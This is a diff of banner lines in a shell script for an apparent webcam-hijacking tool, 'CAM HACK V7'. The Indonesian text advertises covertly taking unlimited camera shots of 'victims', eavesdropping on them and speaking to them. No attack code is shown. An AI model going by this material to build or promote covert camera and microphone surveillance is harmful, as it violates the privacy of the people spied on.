@@ -34,7 +34,7 @@ printf " 					   \n"
 printf "\e[1;92m Coding Scrypt created by SURYA N3  \e[0m\n"
 printf "\e[1;92m ID LOCK input then Server is Active or Ready  \e[0m\n"
 printf "\e[1;96m CAM HACK V7 ugrade tampilan website io tuk korban \e[0m\n"
-printf "\e[1;96m and Bisa nguping obrolan(suara live) hihihi \e[0m\n"
+printf "\e[1;96m and Bisa kejutkan dengan suaramu ke korban hihihi \e[0m\n"
 printf "\e[1;96m and Shot/Take Camera lebih banyak tanpa batas Hahaha \e[0m\n"
 printf "\n"
 
